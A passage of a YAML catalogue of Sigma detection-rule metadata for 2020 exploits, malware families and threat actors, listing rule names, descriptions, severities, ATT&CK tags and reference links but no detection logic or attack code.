  - attack.execution
  - attack.t1053.005
  - attack.t1059.001
  - detection.emerging-threats
  time_window: ''
  references:
  - https://web.archive.org/web/20200226212615/https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/
  - https://web.archive.org/web/20200226212615/https://resources.fox-it.com/rs/170-CAK-271/images/201912_Report_Operation_Wocao.pdf
  - https://twitter.com/SBousseaden/status/1207671369963646976
  false_positives:
  - Administrators that use checkadmin.exe tool to enumerate local administrators
  notes: ''
- detection_id: 7c64e577-d72e-4c3d-9d75-8de6d1f9146a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2020/Exploits/CVE-2020-0688/web_cve_2020_0688_exchange_exploit.yml
  name: CVE-2020-0688 Exploitation Attempt
  description: Detects CVE-2020-0688 Exploitation attempts
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  - cve.2020-0688
  - detection.emerging-threats
  time_window: ''
  references:
  - https://github.com/Ridter/cve-2020-0688
  false_positives:
  - Unknown
  notes: ''
- detection_id: fce2c2e2-0fb5-41ab-a14c-5391e1fd70a5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2020/Exploits/CVE-2020-0688/web_cve_2020_0688_msexchange.yml
  name: CVE-2020-0688 Exchange Exploitation via Web Log
  description: Detects the exploitation of Microsoft Exchange vulnerability as described
    in CVE-2020-0688
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: critical
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  - cve.2020-0688
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.trustedsec.com/blog/detecting-cve-20200688-remote-code-execution-vulnerability-on-microsoft-exchange-server/
  false_positives:
  - Unknown
  notes: ''
- detection_id: d6266bf5-935e-4661-b477-78772735a7cb
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2020/Exploits/CVE-2020-0688/win_vul_cve_2020_0688.yml
  name: CVE-2020-0688 Exploitation via Eventlog
  description: Detects the exploitation of Microsoft Exchange vulnerability as described
    in CVE-2020-0688
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: application
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  - cve.2020-0688
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.trustedsec.com/blog/detecting-cve-20200688-remote-code-execution-vulnerability-on-microsoft-exchange-server/
  - https://cyberpolygon.com/materials/okhota-na-ataki-ms-exchange-chast-2-cve-2020-0688-cve-2020-16875-cve-2021-24085/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 5a35116f-43bc-4901-b62d-ef131f42a9af
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2020/Exploits/CVE-2020-10148/web_cve_2020_10148_solarwinds_exploit.yml
  name: CVE-2020-10148 SolarWinds Orion API Auth Bypass
  description: Detects CVE-2020-10148 SolarWinds Orion API authentication bypass attempts
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - sequence_or_progression_logic
  severity: critical
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  - cve.2020-10148
  - detection.emerging-threats
  time_window: ''
  references:
  - https://kb.cert.org/vuls/id/843464
  false_positives:
  - Unknown
  notes: ''
- detection_id: 846b866e-2a57-46ee-8e16-85fa92759be7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2020/Exploits/CVE-2020-10189/proc_creation_win_exploit_cve_2020_10189.yml
  name: Exploited CVE-2020-10189 Zoho ManageEngine
  description: Detects the exploitation of Zoho ManageEngine Desktop Central Java
    Deserialization vulnerability reported as CVE-2020-10189
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  - T1059.003
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  - attack.execution
  - attack.t1059.001
  - attack.t1059.003
  - attack.s0190
  - cve.2020-10189
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.fireeye.com/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html
  - https://vulmon.com/exploitdetails?qidtp=exploitdb&qid=48224
  false_positives:
  - Unknown
  notes: ''
- detection_id: cc08d590-8b90-413a-aff6-31d1a99678d7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2020/Exploits/CVE-2020-1048/proc_creation_win_exploit_cve_2020_1048.yml
  name: Suspicious PrinterPorts Creation (CVE-2020-1048)
  description: Detects new commands that add new printer port which point to suspicious
    file
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1059.001
  tags:
  - attack.persistence
  - attack.execution
  - attack.t1059.001
  - cve.2020-1048
  - detection.emerging-threats
  time_window: ''
  references:
  - https://windows-internals.com/printdemon-cve-2020-1048/
  false_positives:
  - New printer port install on host
  notes: ''
- detection_id: 7ec912f2-5175-4868-b811-ec13ad0f8567
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2020/Exploits/CVE-2020-1048/registry_set_exploit_cve_2020_1048_new_printer_port.yml
  name: CVE-2020-1048 Exploitation Attempt - Suspicious New Printer Ports - Registry
  description: 'Detects changes to the "Ports" registry key with data that includes
    a Windows path or a file with a suspicious extension.

    This could be an attempt to exploit CVE-2020-1048 - a Windows Print Spooler elevation
    of privilege vulnerability.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1112
  tags:
  - attack.persistence
  - attack.execution
  - attack.defense-evasion
  - attack.t1112
  - cve.2020-1048
  - detection.emerging-threats
  time_window: ''
  references:
  - https://windows-internals.com/printdemon-cve-2020-1048/
  false_positives:
  - New printer port install on host
  notes: ''
- detection_id: b5281f31-f9cc-4d0d-95d0-45b91c45b487
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2020/Exploits/CVE-2020-1350/proc_creation_win_exploit_cve_2020_1350.yml
  name: DNS RCE CVE-2020-1350
  description: Detects exploitation of DNS RCE bug reported in CVE-2020-1350 by the
    detection of suspicious sub process
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1190
  - T1569.002
  tags:
  - attack.initial-access
  - attack.t1190
  - attack.execution
  - attack.t1569.002
  - cve.2020-1350
  - detection.emerging-threats
  time_window: ''
  references:
  - https://research.checkpoint.com/2020/resolving-your-way-into-domain-admin-exploiting-a-17-year-old-bug-in-windows-dns-servers/
  - https://web.archive.org/web/20230329172447/https://blog.menasec.net/2019/02/threat-hunting-24-microsoft-windows-dns.html
  false_positives:
  - Unknown but benign sub processes of the Windows DNS service dns.exe
  notes: ''
- detection_id: dcc6a01e-9471-44a0-a699-71ea96f8ed8b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2020/Exploits/CVE-2020-1472/proc_creation_win_exploit_cve_2020_1472_zero_poc.yml
  name: Exploitation Attempt Of CVE-2020-1472 - Execution of ZeroLogon PoC
  description: Detects the execution of the commonly used ZeroLogon PoC executable.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1210
  tags:
  - attack.execution
  - attack.lateral-movement
  - attack.t1210
  - cve.2020-1472
  - detection.emerging-threats
  time_window: ''
  references:
  - https://thedfirreport.com/2021/11/01/from-zero-to-domain-admin/
  - https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 85d466b0-d74c-4514-84d3-2bdd3327588b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2020/Exploits/CVE-2020-14882/web_cve_2020_14882_weblogic_exploit.yml
  name: Oracle WebLogic Exploit CVE-2020-14882
  description: Detects exploitation attempts on WebLogic servers
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.t1190
  - attack.initial-access
  - cve.2020-14882
  - detection.emerging-threats
  time_window: ''
  references:
  - https://isc.sans.edu/diary/26734
  - https://twitter.com/jas502n/status/1321416053050667009?s=20
  - https://twitter.com/sudo_sudoka/status/1323951871078223874
  false_positives:
  - Unknown
  notes: ''
- detection_id: 15c312b9-00d0-4feb-8870-7d940a4bdc5e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2020/Exploits/CVE-2020-28188/web_cve_2020_28188_terramaster_rce_exploit.yml
  name: TerraMaster TOS CVE-2020-28188
  description: Detects the exploitation of the TerraMaster TOS vulnerability described
    in CVE-2020-28188
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.t1190
  - attack.initial-access
  - cve.2020-28188
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.ihteam.net/advisory/terramaster-tos-multiple-vulnerabilities/
  - https://research.checkpoint.com/2021/freakout-leveraging-newest-vulnerabilities-for-creating-a-botnet/
  false_positives:
  - Unknown
  notes: ''
- detection_id: aba47adc-4847-4970-95c1-61dce62a8b29
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2020/Exploits/CVE-2020-3452/web_cve_2020_3452_cisco_asa_ftd.yml
  name: Cisco ASA FTD Exploit CVE-2020-3452
  description: Detects exploitation attempts on Cisco ASA FTD systems exploiting CVE-2020-3452
    with a status code of 200 (sccessful exploitation)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors:
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.t1190
  - attack.initial-access
  - cve.2020-3452
  - detection.emerging-threats
  time_window: ''
  references:
  - https://twitter.com/aboul3la/status/1286012324722155525
  - https://github.com/darklotuskdb/CISCO-CVE-2020-3452-Scanner-Exploiter
  false_positives:
  - Unknown
  notes: ''
- detection_id: 44b53b1c-e60f-4a7b-948e-3435a7918478
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2020/Exploits/CVE-2020-5902/web_cve_2020_5902_f5_bigip.yml
  name: CVE-2020-5902 F5 BIG-IP Exploitation Attempt
  description: Detects the exploitation attempt of the vulnerability found in F5 BIG-IP
    and described in CVE-2020-5902
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: critical
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  - cve.2020-5902
  - detection.emerging-threats
  time_window: ''
  references:
  - https://support.f5.com/csp/article/K52145254
  - https://www.ptsecurity.com/ww-en/about/news/f5-fixes-critical-vulnerability-discovered-by-positive-technologies-in-big-ip-application-delivery-controller/
  - https://twitter.com/yorickkoster/status/1279709009151434754
  - https://www.criticalstart.com/f5-big-ip-remote-code-execution-exploit/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 0d0d9a8a-a49e-4e27-b061-7ce4b936cfb7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2020/Exploits/CVE-2020-8193/web_cve_2020_8193_8195_citrix_exploit.yml
  name: Citrix ADS Exploitation CVE-2020-8193 CVE-2020-8195
  description: Detects exploitation attempt against Citrix Netscaler, Application
    Delivery Controller (ADS) and Citrix Gateway exploiting vulnerabilities reported
    as CVE-2020-8193 and CVE-2020-8195
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: critical
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  - cve.2020-8193
  - cve.2020-8195
  - detection.emerging-threats
  time_window: ''
  references:
  - https://support.citrix.com/article/CTX276688
  - https://research.nccgroup.com/2020/07/10/rift-citrix-adc-vulnerabilities-cve-2020-8193-cve-2020-8195-and-cve-2020-8196-intelligence/
  - https://dmaasland.github.io/posts/citrix.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: c3198a27-23a0-4c2c-af19-e5328d49680e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2020/Malware/Blue-Mockingbird/proc_creation_win_malware_blue_mockingbird.yml
  name: Blue Mockingbird
  description: Attempts to detect system changes made by Blue Mockingbird
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1047
  - T1112
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.execution
  - attack.t1112
  - attack.t1047
  - detection.emerging-threats
  time_window: ''
  references:
  - https://redcanary.com/blog/blue-mockingbird-cryptominer/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 92b0b372-a939-44ed-a11b-5136cf680e27
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2020/Malware/Blue-Mockingbird/registry_set_mal_blue_mockingbird.yml
  name: Blue Mockingbird - Registry
  description: Attempts to detect system changes made by Blue Mockingbird
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1047
  - T1112
  tags:
  - attack.defense-evasion
  - attack.execution
  - attack.persistence
  - attack.t1112
  - attack.t1047
  - detection.emerging-threats
  time_window: ''
  references:
  - https://redcanary.com/blog/blue-mockingbird-cryptominer/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 7857f021-007f-4928-8b2c-7aedbe64bb82
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2020/Malware/ComRAT/proxy_malware_comrat_network_indicators.yml
  name: ComRAT Network Communication
  description: Detects Turla ComRAT network communication.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: ''
  product: ''
  category: proxy
  data_sources: []
  tactics: []
  techniques:
  - T1071.001
  tags:
  - attack.defense-evasion
  - attack.command-and-control
  - attack.t1071.001
  - attack.g0010
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.welivesecurity.com/wp-content/uploads/2020/05/ESET_Turla_ComRAT.pdf
  false_positives:
  - Unknown
  notes: ''
- detection_id: 54e57ce3-0672-46eb-a402-2c0948d5e3e9
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2020/Malware/Emotet/proc_creation_win_malware_emotet_rundll32_execution.yml
  name: Potential Emotet Rundll32 Execution
  description: Detecting Emotet DLL loading by looking for rundll32.exe processes
    with command lines ending in ,RunDLL or ,Control_RunDLL
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218.011
  tags:
  - attack.defense-evasion
  - attack.t1218.011
  - detection.emerging-threats
  time_window: ''
  references:
  - https://paste.cryptolaemus.com/emotet/2020/12/22/emotet-malware-IoCs_12-22-20.html
  - https://cyber.wtf/2021/11/15/guess-whos-back/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 5118765f-6657-4ddb-a487-d7bd673abbf1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2020/Malware/FlowCloud/registry_event_malware_flowcloud_markers.yml
  name: FlowCloud Registry Markers
  description: 'Detects FlowCloud malware registry markers from threat group TA410.

    The malware stores its configuration in the registry alongside drivers utilized
    by the malware''s keylogger components.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: registry_event
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  tags:
  - attack.defense-evasion
  - attack.persistence
  - attack.t1112
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.proofpoint.com/us/blog/threat-insight/ta410-group-behind-lookback-attacks-against-us-utilities-sector-returns-new
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 7b544661-69fc-419f-9a59-82ccc328f205
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2020/Malware/Ke3chang-TidePool/proc_creation_win_malware_ke3chang_tidepool.yml
  name: Potential Ke3chang/TidePool Malware Activity
  description: Detects registry modifications potentially related to the Ke3chang/TidePool
    malware as seen in campaigns running in 2019 and 2020
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.g0004
  - attack.defense-evasion
  - attack.t1562.001
  - detection.emerging-threats
  time_window: ''
  references:
  - https://web.archive.org/web/20200618080300/https://www.verfassungsschutz.de/embed/broschuere-2020-06-bfv-cyber-brief-2020-01.pdf
  - https://unit42.paloaltonetworks.com/operation-ke3chang-resurfaces-with-new-tidepool-malware/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 29fd07fc-9cfd-4331-b7fd-cc18dfa21052
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2020/Malware/Maze/proc_creation_win_malware_maze_ransomware.yml
  name: Potential Maze Ransomware Activity
  description: Detects specific process characteristics of Maze ransomware word document
    droppers
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  - Impact
  techniques:
  - T1047
  - T1204.002
  - T1490
  tags:
  - attack.execution
  - attack.t1204.002
  - attack.t1047
  - attack.impact
  - attack.t1490
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html
  - https://app.any.run/tasks/51e7185c-52d7-4efb-ac0d-e86340053473/
  - https://app.any.run/tasks/65a79440-373a-4725-8d74-77db9f2abda4/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 58bf96d9-ff5f-44bd-8dcc-1c4f79bf3a27
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2020/Malware/Trickbot/proc_creation_win_malware_trickbot_wermgr.yml
  name: Trickbot Malware Activity
  description: Detects Trickbot malware process tree pattern in which "rundll32.exe"
    is a parent of "wermgr.exe"
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: stable
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1559
  tags:
  - attack.execution
  - attack.t1559
  - detection.emerging-threats
  time_window: ''
  references:
  - https://twitter.com/swisscom_csirt/status/1331634525722521602?s=20
  - https://app.any.run/tasks/f74c5157-8508-4ac6-9805-d63fe7b0d399/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 8acf3cfa-1e8c-4099-83de-a0c4038e18f0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2020/TA/Evilnum/proc_creation_win_apt_evilnum_jul20.yml
  name: EvilNum APT Golden Chickens Deployment Via OCX Files
  description: Detects Golden Chickens deployment method as used by Evilnum and described
    in ESET July 2020 report
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218.011
  tags:
  - attack.defense-evasion
  - attack.t1218.011
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.welivesecurity.com/2020/07/09/more-evil-deep-look-evilnum-toolset/
  - https://app.any.run/tasks/33d37fdf-158d-4930-aa68-813e1d5eb8ba/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 440a56bf-7873-4439-940a-1c8a671073c2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2020/TA/GALLIUM/proc_creation_win_apt_gallium_iocs.yml
  name: GALLIUM IOCs
  description: Detects artifacts associated with GALLIUM cyber espionage group as
    reported by Microsoft Threat Intelligence Center in the December 2019 report.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1071
  - T1212
  tags:
  - attack.credential-access
  - attack.command-and-control
  - attack.t1212
  - attack.t1071
  - attack.g0093
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.microsoft.com/security/blog/2019/12/12/gallium-targeting-global-telecom/
  - https://github.com/Azure/Azure-Sentinel/blob/a02ce85c96f162de6f8cc06f07a53b6525f0ff7f/Solutions/Legacy%20IOC%20based%20Threat%20Protection/Analytic%20Rules/GalliumIOCs.yaml
  false_positives:
  - Unknown
  notes: ''
- detection_id: 3db10f25-2527-4b79-8d4b-471eb900ee29
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2020/TA/GALLIUM/win_dns_analytic_apt_gallium.yml
  name: GALLIUM Artefacts - Builtin
  description: Detects artefacts associated with activity group GALLIUM - Microsoft
    Threat Intelligence Center indicators released in December 2019.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: dns-server-analytic
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1071
  tags:
  - attack.credential-access
  - attack.command-and-control
  - attack.t1071
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.microsoft.com/security/blog/2019/12/12/gallium-targeting-global-telecom/
  - https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn800669(v=ws.11)
  false_positives:
  - Unknown
  notes: ''
- detection_id: 3711eee4-a808-4849-8a14-faf733da3612
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2020/TA/Greenbug/proc_creation_win_apt_greenbug_may20.yml
  name: Greenbug Espionage Group Indicators
  description: Detects tools and process executions used by Greenbug in their May
    2020 campaign as reported by Symantec
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: critical
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1036.005
  - T1059.001
  - T1105
  tags:
  - attack.g0049
  - attack.execution
  - attack.t1059.001
  - attack.command-and-control
  - attack.t1105
  - attack.defense-evasion
  - attack.t1036.005
  - detection.emerging-threats
  time_window: ''
  references:
  - https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/greenbug-espionage-telco-south-asia
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 24c4d154-05a4-4b99-b57d-9b977472443a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2020/TA/Lazarus/proc_creation_win_apt_lazarus_group_activity.yml
  name: Lazarus Group Activity
  description: Detects different process execution behaviors as described in various
    threat reports on Lazarus group activity
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  tags:
  - attack.g0032
  - attack.execution
  - attack.t1059
  - detection.emerging-threats
  time_window: ''
  references:
  - https://securelist.com/lazarus-covets-covid-19-related-intelligence/99906/
  - https://www.hvs-consulting.de/lazarus-report/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 70d43542-cd2d-483c-8f30-f16b436fd7db
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2020/TA/Leviathan/registry_event_apt_leviathan.yml
  name: Leviathan Registry Key Activity
  description: Detects registry key used by Leviathan APT in Malaysian focused campaign
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: registry_event
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1547.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1547.001
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.elastic.co/blog/advanced-techniques-used-in-malaysian-focused-apt-campaign
  false_positives: []
  notes: ''
- detection_id: 9be34ad0-b6a7-4fbd-91cf-fc7ec1047f5f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2020/TA/SolarWinds-Supply-Chain/proc_creation_win_apt_unc2452_cmds.yml
  name: UNC2452 Process Creation Patterns
  description: Detects a specific process creation patterns as seen used by UNC2452
    and provided by Microsoft as Microsoft Defender ATP queries
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/
  false_positives:
  - Unknown
  notes: ''
- detection_id: b7155193-8a81-4d8f-805d-88de864ca50c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2020/TA/SolarWinds-Supply-Chain/proc_creation_win_apt_unc2452_ps.yml
  name: UNC2452 PowerShell Pattern
  description: Detects a specific PowerShell command line pattern used by the UNC2452
    actors as mentioned in Microsoft and Symantec reports
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1047
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  - attack.t1047
  - detection.emerging-threats
  time_window: ''
  references:
  - https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/solarwinds-raindrop-malware
  - https://www.microsoft.com/security/blog/2020/12/18/analyzing-solorigate-the-compromised-dll-file-that-started-a-sophisticated-cyberattack-and-how-microsoft-defender-helps-protect/
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1047/T1047.md#atomic-test-7---create-a-process-using-wmi-query-and-an-encoded-command
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 20c3f09d-c53d-4e85-8b74-6aa50e2f1b61
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2020/TA/SolarWinds-Supply-Chain/proc_creation_win_apt_unc2452_vbscript_pattern.yml
  name: Suspicious VBScript UN2452 Pattern
  description: Detects suspicious inline VBScript keywords as used by UNC2452
